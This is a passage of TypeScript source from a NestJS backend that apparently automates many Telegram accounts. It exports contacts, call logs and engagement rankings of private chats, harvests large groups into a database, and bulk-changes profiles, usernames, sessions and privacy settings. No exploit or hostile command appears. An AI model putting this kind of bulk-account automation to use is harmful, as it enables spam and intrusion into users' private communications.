'Binary file (when sourceType is binary)' },\n                caption: { type: 'string', description: 'Optional caption for the media' },\n                filename: { type: 'string', description: 'Optional filename for the media' }\n            },\n            required: ['chatId', 'sourceType']\n        }\n    })\n    @UseInterceptors(FileInterceptor('binaryData', { storage: multer.memoryStorage() }))\n    @ApiResponse({ type: Object })\n    async sendViewOnceMedia(@Param('mobile') mobile: string, @UploadedFile() file: Express.Multer.File, @Body() viewOnceDto: ViewOnceMediaDto) {\n        if (viewOnceDto.sourceType === MediaSourceType.BINARY && file) {\n            return this.telegramService.sendViewOnceMedia(mobile, {\n                chatId: viewOnceDto.chatId,\n                sourceType: viewOnceDto.sourceType,\n                binaryData: file.buffer,\n                caption: viewOnceDto.caption,\n                filename: viewOnceDto.filename || file.originalname\n            });\n        }\n        return this.telegramService.sendViewOnceMedia(mobile, {\n            chatId: viewOnceDto.chatId,\n            sourceType: viewOnceDto.sourceType,\n            path: viewOnceDto.path,\n            base64Data: viewOnceDto.base64Data,\n            caption: viewOnceDto.caption,\n            filename: viewOnceDto.filename\n        });\n    }\n\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    @ApiResponse({ type: Object })\n    async getChatHistory(@Param('mobile') mobile: string, @Query('chatId') chatId: string, @Query('offset') offset?: number, @Query('limit') limit?: number) {\n        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    @ApiResponse({ type: Object })\n    async promoteToAdmin(@Param('mobile') mobile: string, @Body() adminOp: AdminOperationDto) {\n        return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    @ApiResponse({ type: Object })\n    async demoteAdmin(@Param('mobile') mobile: string, @Body() memberOp: GroupMemberOperationDto) {\n        return this.telegramService.demoteAdmin(mobile, memberOp.groupId, memberOp.members[0]);\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { groupId: { type: 'string' }, userId: { type: 'string' } } } })\n    @ApiResponse({ type: Object })\n    async unblockGroupUser(@Param('mobile') mobile: string, @Body() data: { groupId: string; userId: string }) {\n        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    @ApiResponse({ type: Object })\n    async getGroupAdmins(@Param('mobile') mobile: string, @Query('groupId') groupId: string) {\n        return this.telegramService.getGroupAdmins(mobile, groupId);\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    @ApiResponse({ type: Object })\n    async getGroupBannedUsers(@Param('mobile') mobile: string, @Query('groupId') groupId: string) {\n        return this.telegramService.getGroupBannedUsers(mobile, groupId);\n    }\n\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    @ApiResponse({ type: Object })\n    async exportContacts(@Param('mobile') mobile: string, @Body() exportDto: ContactExportImportDto, @Res() res: Response) {\n        const data = await this.telegramService.exportContacts(mobile, exportDto.format, exportDto.includeBlocked);\n        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n        res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n        res.send(data);\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'array', items: { type: 'object', properties: { firstName: { type: 'string' }, lastName: { type: 'string' }, phone: { type: 'string' } } } } })\n    @ApiResponse({ type: Object })\n    async importContacts(@Param('mobile') mobile: string, @Body() contacts: { firstName: string; lastName?: string; phone: string }[]) {\n        return this.telegramService.importContacts(mobile, contacts);\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    @ApiResponse({ type: Object })\n    async manageBlockList(@Param('mobile') mobile: string, @Body() blockList: ContactBlockListDto) {\n        return this.telegramService.manageBlockList(mobile, blockList.userIds, blockList.block);\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.telegramService.getContactStatistics(mobile);\n    }\n\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    @ApiResponse({ type: Object })\n    async createChatFolder(@Param('mobile') mobile: string, @Body() folder: CreateChatFolderDto) {\n        return this.telegramService.createChatFolder(mobile, folder);\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.telegramService.getChatFolders(mobile);\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { chatId: { type: 'string' }, messageId: { type: 'number' }, text: { type: 'string' }, media: { type: 'object', properties: { type: { type: 'string', enum: ['photo', 'video', 'document'] }, url: { type: 'string' } } } } } })\n    @ApiResponse({ type: Object })\n    async editMessage(@Param('mobile') mobile: string, @Body() options: { chatId: string; messageId: number; text?: string; media?: { type: 'photo' | 'video' | 'document'; url: string } }) {\n        return this.telegramService.editMessage(mobile, options);\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { chatId: { type: 'string' }, title: { type: 'string' }, about: { type: 'string' }, photo: { type: 'string' }, slowMode: { type: 'number' }, linkedChat: { type: 'string' }, defaultSendAs: { type: 'string' }, username: { type: 'string' } } } })\n    @ApiResponse({ type: Object })\n    async updateChatSettings(@Param('mobile') mobile: string, @Body() settings: { chatId: string; title?: string; about?: string; photo?: string; slowMode?: number; linkedChat?: string; defaultSendAs?: string; username?: string }) {\n        return this.telegramService.updateChatSettings(mobile, settings);\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { chatId: { type: 'string' }, media: { type: 'array', items: { type: 'object', properties: { type: { type: 'string', enum: ['photo', 'video', 'document'] }, url: { type: 'string' }, caption: { type: 'string' }, fileName: { type: 'string' } } } }, silent: { type: 'boolean' }, scheduleDate: { type: 'number' } } } })\n    @ApiResponse({ type: Object })\n    async sendMediaBatch(@Param('mobile') mobile: string, @Body() options: { chatId: string; media: Array<{ type: 'photo' | 'video' | 'document'; url: string; caption?: string; fileName?: string }>; silent?: boolean; scheduleDate?: number }) {\n        return this.telegramService.sendMediaBatch(mobile, options);\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.telegramService.hasPassword(mobile);\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    @ApiQuery({ name: 'filename', required: true })\n    @ApiResponse({ type: String })\n    async getFileUrl(@Param('mobile') mobile: string, @Query('url') url: string, @Query('filename') filename: string): Promise<string> {\n        return this.telegramService.getFileUrl(mobile, url, filename);\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { chatId: { type: 'string' }, period: { type: 'string', enum: ['day', 'week', 'month'] }, fromDate: { type: 'string', format: 'date-time' } } } })\n    @ApiResponse({ type: Object })\n    async getMessageStats(@Param('mobile') mobile: string, @Body() options: { chatId: string; period: 'day' | 'week' | 'month'; fromDate?: Date }) {\n        return this.telegramService.getMessageStats(mobile, options);\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ \n        summary: 'Get top private chats with smart activity-based filtering',\n        description: 'Retrieves top private chats ranked by engagement score using advanced filtering. ' +\n                     'Uses time-decay scoring, conversation patterns, and dialog metadata for accurate results. ' +\n                     'Considers recency, mutual engagement, reply chains, and call history. ' +\n                     'Supports configurable limit (default: 10, max: 50).'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ \n        name: 'limit', \n        required: false, \n        type: Number,\n        description: 'Maximum number of top chats to return (default: 10, min: 1, max: 50)',\n        example: 10\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Top private chats retrieved successfully',\n        schema: {\n            type: 'array',\n            items: {\n                type: 'object',\n                properties: {\n                    chatId: { type: 'string', description: 'Chat/user ID' },\n                    username: { type: 'string', description: 'Username (if available)' },\n                    firstName: { type: 'string', description: 'First name' },\n                    lastName: { type: 'string', description: 'Last name' },\n                    totalMessages: { type: 'number', description: 'Total messages in conversation' },\n                    interactionScore: { \n                        type: 'number', \n                        description: 'Calculated engagement score (higher = more active)' \n                    },\n                    engagementLevel: { \n                        type: 'string', \n                        enum: ['recent', 'active', 'dormant'],\n                        description: 'Activity classification: recent (7 days), active (7-30 days), dormant (30-90 days)'\n                    },\n                    lastActivityDays: { \n                        type: 'number', \n                        description: 'Days since last activity' \n                    },\n                    calls: {\n                        type: 'object',\n                        properties: {\n                            total: { type: 'number' },\n                            incoming: {\n                                type: 'object',\n                                properties: {\n                                    total: { type: 'number' },\n                                    audio: { type: 'number' },\n                                    video: { type: 'number' }\n                                }\n                            },\n                            outgoing: {\n                                type: 'object',\n                                properties: {\n                                    total: { type: 'number' },\n                                    audio: { type: 'number' },\n                                    video: { type: 'number' }\n                                }\n                            }\n                        }\n                    },\n                    media: {\n                        type: 'object',\n                        properties: {\n                            photos: { type: 'number', description: 'Total photos shared' },\n                            videos: { type: 'number', description: 'Total videos shared' }\n                        }\n                    },\n                    activityBreakdown: {\n                        type: 'object',\n                        description: 'Percentage breakdown of interaction types',\n                        properties: {\n                            videoCalls: { type: 'number', description: 'Percentage from video calls' },\n                            audioCalls: { type: 'number', description: 'Percentage from audio calls' },\n                            mediaSharing: { type: 'number', description: 'Percentage from media sharing' },\n                            textMessages: { type: 'number', description: 'Percentage from text messages' }\n                        }\n                    }\n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 500, description: 'Internal Server Error' })\n    async getTopPrivateChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getTopPrivateChats(mobile, limit);\n    }\n\n    @Get('messages/self-msg-info/:mobile')\n    @ApiOperation({ \n        summary: 'Get statistics about media messages in saved messages',\n        description: 'Retrieves comprehensive statistics about photos, videos, and movies in saved messages (self chat). ' +\n                     'Uses memory-efficient iterMessages for processing large message histories. ' +\n                     'Supports configurable limit for analysis scope (default: 500, max: 10000).'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ \n        name: 'limit', \n        required: false, \n        type: Number,\n        description: 'Maximum number of messages to analyze (default: 500, max: 10000)',\n        example: 500,\n        minimum: 1,\n        maximum: 10000\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Self messages statistics retrieved successfully',\n        schema: {\n            type: 'object',\n            properties: {\n                total: { type: 'number', description: 'Total messages in saved messages' },\n                photoCount: { type: 'number', description: 'Total photos' },\n                videoCount: { type: 'number', description: 'Total videos' },\n                movieCount: { \n                    type: 'number', \n                    description: 'Messages containing movie-related keywords (links, shared content)' \n                },\n                ownPhotoCount: { type: 'number', description: 'Photos sent by user' },\n                otherPhotoCount: { type: 'number', description: 'Photos received from others' },\n                ownVideoCount: { type: 'number', description: 'Videos sent by user' },\n                otherVideoCount: { type: 'number', description: 'Videos received from others' },\n                analyzedMessages: { \n                    type: 'number', \n                    description: 'Number of messages actually analyzed' \n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 400, description: 'Bad Request - invalid limit parameter' })\n    @ApiResponse({ status: 500, description: 'Internal Server Error' })\n    async getSelfMsgsInfo(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number\n    ) {\n        if (limit !== undefined && (limit < 1 || limit > 10000)) {\n            throw new BadRequestException('Limit must be between 1 and 10000.');\n        }\n        return this.telegramService.getSelfMsgsInfo(mobile, limit);\n    }\n\n    @Post('bots/add-to-channel/:mobile')\n    @ApiOperation({ summary: 'Add bots to channel with admin privileges' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ schema: { type: 'object', properties: { channelIds: { type: 'array', items: { type: 'string' }, description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.' } } } })\n    @ApiResponse({ type: Object })\n    async addBotsToChannel(@Param('mobile') mobile: string, @Body() body: { channelIds?: string[] }) {\n        return this.telegramService.addBotsToChannel(mobile, body.channelIds);\n    }\n\n    @Post('bot/create/:mobile')\n    @ApiOperation({ summary: 'Create a new bot using BotFather' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateTgBotDto })\n    @ApiResponse({ type: Object, schema: { properties: { botToken: { type: 'string', description: 'The token to access HTTP Bot API' }, username: { type: 'string', description: 'The username of the created bot' } } } })\n    async createBot(@Param('mobile') mobile: string, @Body() createBotDto: CreateTgBotDto) {\n        return this.telegramService.createBot(mobile, createBotDto);\n    }\n}","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n    imports: [\n        InitModule,\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: new TelegramLogger('TELEGRAM_LOGGER')\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { UsersService } from '../users/users.service';\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { connectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport * as fs from 'fs';\nimport { sleep } from 'telegram/Helpers';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { SearchMessagesDto } from './dto/message-search.dto';\nimport { CreateTgBotDto } from './dto/create-bot.dto';\nimport { Api } from 'telegram';\nimport { fetchNumbersFromString, shouldMatch } from '../../utils';\nimport { ConnectionStatusDto, GetClientOptionsDto } from './dto/connection-management.dto';\nimport { ActiveChannel } from '../active-channels';\nimport { channelInfo } from '../../utils/telegram-utils/channelinfo';\nimport isPermanentError from '../../utils/isPermanentError';\nimport { SendTgMessageDto } from './dto/send-message.dto';\nimport { getDialogs } from 'telegram/client/dialogs';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private readonly logger: TelegramLogger;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.logger = new TelegramLogger('TgService');\n        connectionManager.setUsersService(this.usersService);\n    }\n\n    async onModuleDestroy() {\n        this.logger.info('system', 'Module destroy initiated');\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel | ActiveChannel) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            this.logger.debug(telegramClient.phoneNumber, `Joined channel Success: `, `@${chatEntity.username}`);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     this.logger.debug(mobile, \"updated ActiveChannels\");\n                // } catch (error) {\n                //     this.logger.debug(parseError(error));\n                //     this.logger.debug(mobile, \"Failed to update ActiveChannels\");\n                // }\n            } else {\n                // await this.channelsService.remove(chatEntity.channelId);\n                // await this.activeChannelsService.remove(chatEntity.channelId);\n                // this.logger.debug(mobile, `Removed Channel: `, `@${chatEntity.username}`);\n            }\n        } catch (error) {\n            this.logger.debug(telegramClient.phoneNumber, `Failed to join: `, `@${chatEntity.username}`);\n\n            //To check if Account is Frozen\n            if (error.toString().includes(\"No user has\")) {\n                await telegramClient.client.invoke(\n                    new Api.account.SetPrivacy({\n                        key: new Api.InputPrivacyKeyPhoneCall(),\n                        rules: [\n                            new Api.InputPrivacyValueDisallowAll()\n                        ],\n                    })\n                );\n            }\n\n            await this.removeChannels(error, chatEntity.channelId, chatEntity.username, mobile);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string, mobile: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            // try {\n            //     if (channelId) {\n            //         await this.channelsService.remove(channelId)\n            //         await this.activeChannelsService.remove(channelId);\n            //         this.logger.debug(mobile, `Removed Channel:  [${channelId}]`);\n            //     } else {\n            //         const channelDetails = (await this.channelsService.search({ username: username }))[0];\n            //         await this.channelsService.remove(channelDetails.channelId)\n            //         await this.activeChannelsService.remove(channelDetails.channelId);\n            //         this.logger.debug(mobile, `Removed Channel: [${channelDetails.channelId}]`);\n            //     }\n            // } catch (searchError) {\n            //     this.logger.debug(mobile, \"Failed to search/remove channel: \", searchError);\n            // }\n\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            this.logger.error(mobile, \"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            this.logger.error(mobile, \"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            this.logger.error(mobile, \"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string, limit?: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            return await telegramClient.getSelfMSgsInfo(limit);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting self messages info:', error);\n            throw error;\n        }\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardMedia(mobile: string, channel: string, fromChatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.forwardMedia(channel, fromChatId);\n        setTimeout(async () => {\n            try {\n                await this.leaveChannel(mobile, \"2302868706\");\n            } catch (error) {\n                this.logger.debug(mobile, \"Error in forwardMedia: \", error);\n            }\n        }, 5 * 60000);\n        return \"Media forward initiated\";\n    }\n\n    async forwardMediaToBot(mobile: string, fromChatId: string): Promise<string> {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            await telegramClient.forwardMedia('', fromChatId);\n            const dialogs: any[] = [];\n            // Use iterDialogs for memory-efficient iteration\n            for await (const dialog of telegramClient.client.iterDialogs({ limit: 500 })) {\n                dialogs.push(dialog);\n            }\n            \n            const channels = dialogs\n                .filter(chat => chat.isChannel || chat.isGroup)\n                .map(chat => {\n                    const chatEntity = chat.entity as Api.Channel;\n                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\n\n                    if (!chatEntity.broadcast &&\n                        !cannotSendMsgs &&\n                        chatEntity.participantsCount > 50 &&\n                        shouldMatch(chatEntity)) {\n\n                        return {\n                            channelId: chatEntity.id.toString(),\n                            canSendMsgs: true,\n                            participantsCount: chatEntity.participantsCount,\n                            private: false,\n                            title: chatEntity.title,\n                            broadcast: chatEntity.broadcast,\n                            megagroup: chatEntity.megagroup,\n                            restricted: chatEntity.restricted,\n                            sendMessages: true,\n                            username: chatEntity.username,\n                            forbidden: false\n                        };\n                    }\n                    return null;\n                })\n                .filter((channel): channel is NonNullable<typeof channel> => Boolean(channel));\n\n            await connectionManager.unregisterClient(mobile);\n            await this.channelsService.createMultiple(channels);\n            await this.activeChannelsService.createMultiple(channels);\n            return \"Media forward initiated successfully\";\n        } catch (error) {\n            this.logger.error(mobile, \"Error forwarding media:\", error);\n            return `Media forward failed: ${error.message}`;\n        }\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string, limit?: number, includeCallLog?: boolean) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            return await telegramClient.getCallLog(limit, { includeCallLog });\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting call log:', error);\n            throw error;\n        }\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const channels = await channelInfo(telegramClient.client, sendIds);\n        return channels\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getEntity(entity); // Assuming 'getEntity()' is a valid method\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error, `Faile to Set 2FA: ${mobile}`)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            this.logger.debug(mobile, \"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error, `Failed to Set Profile Pics: ${mobile}`)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error, `Failed to Update Privacy`)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            const errorDetails = parseError(error, `Error Downloading Profile Picture:`)\n            this.logger.error(mobile, errorDetails.message, error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            const errorDetails = parseError(error, `Error Updating Username:`)\n            this.logger.error(mobile, errorDetails.message, error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsernameForAClient(mobile: string, clientId: string, clientName: string, currentUsername: string,) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const [firstName, middleName = ''] = clientName.split(' ');\n        const firstPart = firstName.slice(0, 4);\n        const middlePart = middleName.slice(0, 3);\n\n        // Build regex dynamically\n        const pattern = `^${firstPart}${middlePart}\\\\d+$`;\n        const usernameRegex = new RegExp(pattern, 'i');\n        if (!usernameRegex.test(currentUsername)) {\n            const firstNameCaps = firstPart[0].toUpperCase() + firstPart.slice(1);\n            const middleNameCaps = middlePart ? middlePart[0].toUpperCase() + middlePart.slice(1) : '';\n            const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId) + Math.floor(Math.random() * 1000);\n            return await telegramClient.updateUsername(baseUsername);\n        }\n        this.logger.log(mobile, \"Username is already matching required regex, Skipping Username update\");\n        return currentUsername;\n    }\n\n    async getMediaMetadata(mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];\n            startDate?: Date;\n            endDate?: Date;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n        }) {\n        const telegramClient = await 